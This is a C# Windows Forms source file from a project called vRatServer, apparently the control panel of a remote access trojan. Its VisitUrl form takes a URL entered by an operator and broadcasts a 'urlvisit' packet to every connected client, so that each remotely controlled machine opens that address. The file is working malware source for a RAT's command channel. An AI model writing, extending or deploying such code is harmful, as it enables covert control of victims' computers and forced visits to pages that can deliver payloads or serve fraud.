using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using vRatServer.Classes;

namespace vRatServer.Forms
{
    public partial class VisitUrl : Form
    {
        List<Client> clients;
        public VisitUrl(List<Client> clients)
        {
            this.clients = clients;
            InitializeComponent();
        }

        private void VisitUrl_Load(object sender, EventArgs e)
        {

        }

        private void button1_Click(object sender, EventArgs e)
        {
            byte []y = Encoding.Unicode.GetBytes(textBox1.Text);
            byte[] urlbyt = y.Concat(new byte[] { 0x00, 0x00 }).ToArray();

            foreach (Client c in clients)
            {
                globals.SendPacket(c, (byte)globals.PacketType.urlvisit, urlbyt.Length, 0, ref urlbyt);
            }
            this.Close();
        }
    }
}
